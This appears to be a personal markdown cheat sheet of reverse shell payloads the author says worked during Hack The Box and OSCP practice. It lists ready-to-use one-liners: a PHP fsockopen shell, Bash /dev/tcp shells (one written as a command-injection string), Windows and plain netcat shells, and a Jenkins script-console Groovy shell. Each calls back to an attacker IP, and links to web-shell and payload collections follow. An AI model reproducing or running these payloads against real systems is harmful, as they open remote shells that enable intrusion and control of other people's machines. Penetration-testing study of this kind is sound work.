## Reverse shells that actually worked during my travels

## Php

```
php -r '$sock=fsockopen("10.10.14.31",4321);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Bash

``` (from Script Kiddie, htb)
;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.176/4444 0>&1' #
```


## Bash2

```(From OSCP Study, this takes no " or ')
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```


## Reverse Shell Generator:

https://github.com/mthbernardes/rsg

## Reverse shells:

-webshells
https://github.com/jbarcia/Web-Shells/tree/master/laudanum

-reverse shells
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


## Netcat on windows:

```
nc.exe -nv 10.10.14.31 4444 -e cmd.exe

```

## Netcat without an "-e" or "-c" option

```
/bin/sh | nc [IPADDR] [PORT]
```


## Groovy via Scipt Console on Jenkins

```groovy

String host="10.10.14.18";
int port=4444;
String cmd="sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();



```